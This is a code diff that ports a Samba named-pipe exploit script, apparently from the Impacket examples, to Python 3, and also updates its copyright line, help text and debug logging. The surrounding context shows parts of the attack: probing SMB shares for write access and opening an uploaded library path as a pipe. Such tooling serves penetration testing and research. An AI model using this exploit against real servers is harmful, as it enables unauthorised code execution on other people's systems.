@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# Copyright (c) 2003-2017 CORE Security Technologies
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -54,14 +54,14 @@ class PIPEDREAM:
         try:
             logging.debug('Connecting to share %s' % shareName)
             tid = self.__smbClient.connectTree(shareName)
-        except Exception, e:
+        except Exception as e:
             logging.debug(str(e))
             return False
 
         try:
             self.__smbClient.openFile(tid, '\\', FILE_WRITE_DATA, creationOption=FILE_DIRECTORY_FILE)
             writable = True
-        except Exception, e:
+        except Exception:
             writable = False
             pass
 
@@ -115,7 +115,7 @@ class PIPEDREAM:
         if fileName != '':
             smb2Create['Buffer'] = fileName.encode('utf-16le')
         else:
-            smb2Create['Buffer'] = '\x00'
+            smb2Create['Buffer'] = b'\x00'
 
         if createContexts is not None:
             smb2Create['Buffer'] += createContexts
@@ -185,7 +185,7 @@ class PIPEDREAM:
         logging.info('Share path is %s' % sharePath)
         try:
             self.openPipe(sharePath, fileName)
-        except Exception, e:
+        except Exception as e:
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                 logging.info('Expected STATUS_OBJECT_NAME_NOT_FOUND received, doesn\'t mean the exploit worked tho')
             else:
@@ -199,7 +199,7 @@ class PIPEDREAM:
 if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description="Samba Pipe exploit")
 
@@ -222,10 +222,10 @@ if __name__ == '__main__':
     group = parser.add_argument_group('connection')
 
     group.add_argument('-dc-ip', action='store', metavar="ip address",
-                       help='IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in '
+                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                             'the target parameter')
     group.add_argument('-target-ip', action='store', metavar="ip address",
-                       help='IP Address of the target machine. If ommited it will use whatever was specified as target. '
+                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                             'This is useful when target is the NetBIOS name and you cannot resolve it')
     group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                        help='Destination port to connect to SMB Server')
@@ -238,6 +238,8 @@ if __name__ == '__main__':
 
     if options.debug is True:
         logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
     else:
         logging.getLogger().setLevel(logging.INFO)
 
@@ -283,8 +285,8 @@ if __name__ == '__main__':
             smbClient._SMBConnection._Session['SessionFlags'] &=  ~SMB2_SESSION_FLAG_ENCRYPT_DATA
         pipeDream = PIPEDREAM(smbClient, options)
         pipeDream.run()
-    except Exception, e:
-        #import traceback
-        #print traceback.print_exc()
+    except Exception as e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
         logging.error(str(e))
-
